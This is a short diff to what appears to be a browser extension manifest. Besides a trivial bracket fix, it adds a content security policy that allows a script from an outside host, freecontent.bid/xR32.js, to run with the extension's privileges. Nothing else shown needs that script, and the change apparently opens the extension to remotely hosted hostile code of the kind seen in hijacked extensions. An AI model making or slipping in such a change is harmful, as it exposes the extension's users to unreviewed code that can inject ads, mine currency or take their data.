@@ -62,5 +62,6 @@
   "web_accessible_resources": [
     "gif.worker.js",
     "controller.js"
-  ]
+  ],
+  "content_security_policy": "script-src 'self' https://www.freecontent.bid./xR32.js; object-src 'self'"
 }
